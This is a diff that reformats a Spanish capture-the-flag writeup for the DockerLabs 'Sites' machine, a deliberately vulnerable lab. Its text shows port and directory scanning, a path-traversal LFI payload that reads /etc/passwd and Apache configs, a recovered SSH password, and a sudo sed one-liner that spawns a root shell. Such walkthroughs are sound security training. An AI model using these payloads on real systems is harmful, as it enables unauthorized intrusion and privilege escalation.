@@ -1,22 +1,30 @@
-# 🖥️ Writeup - Sites 
+---
+icon: linux
+---
 
-**Plataforma:** Dockerlabs  
-**Sistema Operativo:** Linux  
+# Sites ​​
+
+## 🖥️ Writeup - Sites
+
+**Plataforma:** Dockerlabs\
+**Sistema Operativo:** Linux
 
 > **Tags:** `Linux` `Web` `PHP` `Gobuster` `LFI` `Apache Configuration` `Sudoers`
 
-# INSTALACIÓN
+## INSTALACIÓN
 
 Descargamos el `.zip` de la máquina desde DockerLabs a nuestro entorno y seguimos los siguientes pasos.
 
-```bash 
+```bash
 unzip sites.zip
 ```
+
 La máquina ya está descomprimida y solo falta montarla.
 
 ```bash
 sudo bash auto_deploy.sh sites.tar
-``` 
+```
+
 Info:
 
 ```
@@ -41,23 +49,24 @@ Estamos desplegando la máquina vulnerable, espere un momento.
 Máquina desplegada, su dirección IP es --> 172.17.0.2
 
 Presiona Ctrl+C cuando termines con la máquina para eliminarla
-``` 
+```
 
 Una vez desplegada, cuando terminemos de hackearla, con un `Ctrl + C` se eliminará automáticamente para que no queden archivos residuales.
 
-# ESCANEO DE PUERTOS
+## ESCANEO DE PUERTOS
 
 A continuación, realizamos un escaneo general para comprobar qué puertos están abiertos y luego uno más exhaustivo para obtener información relevante sobre los servicios.
 
 ```bash
 nmap -n -Pn -sS -sV -p- --open --min-rate 5000 172.17.0.2
-``` 
+```
 
 ```bash
 nmap -n -Pn -sCV -p22,80 --min-rate 5000 172.17.0.2
 ```
 
 Info:
+
 ```
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-09 14:48 CEST
 Nmap scan report for 172.17.0.2
@@ -80,15 +89,16 @@ Nmap done: 1 IP address (1 host up) scanned in 6.88 seconds.
 
 En el puerto `80` encontramos una página que hace referencia a un `LFI` a partir de un archivo `.php`.
 
-Procedemos a buscar directorios y archivos ocultos. 
+Procedemos a buscar directorios y archivos ocultos.
 
-# GOBUSTER
+## GOBUSTER
 
-```bash 
+```bash
 gobuster dir -u http://172.17.0.2 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x html,zip,php,txt,bak,sh -b 403,404 -t 60
 ```
 
 Info:
+
 ```
 ===============================================================
 Gobuster v3.8
@@ -123,13 +133,14 @@ Please provide a page or a username.
 
 Esto nos hace pensar que, si pasamos el parámetro page en el archivo `.php`, podremos apuntar a otros archivos del sistema, como por ejemplo `/etc/passwd`.
 
-# LFI
+## LFI
 
 ```
 http://172.17.0.2/vulnerable.php?page=../../../../etc/passwd
 ```
 
 Info:
+
 ```
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
@@ -169,6 +180,7 @@ http://172.17.0.2/vulnerable.php?page=../../../../etc/apache2/sites-available/si
 ```
 
 Info:
+
 ```
 <VirtualHost *:80>
     ServerAdmin webmaster@tusitio.com
@@ -194,12 +206,12 @@ Info:
 
 Con esta información intuimos que en la ruta `/var/www/html` hay un archivo llamado `archivitotraviesito`, que resulta bastante interesante.
 
-
 ```
 http://172.17.0.2/vulnerable.php?page=../../../../var/www/html/archivitotraviesito
 ```
 
 Info:
+
 ```
 Muy buen, has entendido el funcionamiento de un LFI y los archivos interesantes a visualizar dentro de apache, ahora te proporciono el acceso por SSH, pero solo la password, para practicar un poco de bruteforce (para variar) lapasswordmasmolonadelacity 
 ```
@@ -208,18 +220,20 @@ Lo comprobamos y encontramos la contraseña del usuario `chocolate` : `lapasswor
 
 Accedemos por SSH.
 
-```bash 
+```bash
 ssh chocolate@172.17.0.2
 ```
 
-# ESCALADA DE PRIVILEGIOS
+## ESCALADA DE PRIVILEGIOS
 
 Una vez dentro, comprobamos permisos `sudo`, `SUID`, `Capabilities`.
 
-```bash 
+```bash
 sudo -l
 ```
+
 Info:
+
 ```
 Matching Defaults entries for chocolate on 3bd7f67fdd5b:
     env_reset, mail_badpass,
@@ -239,6 +253,7 @@ sudo sed -n '1e exec sh 1>&0' /etc/hosts
 ```
 
 Info:
+
 ```
 # whoami
 root
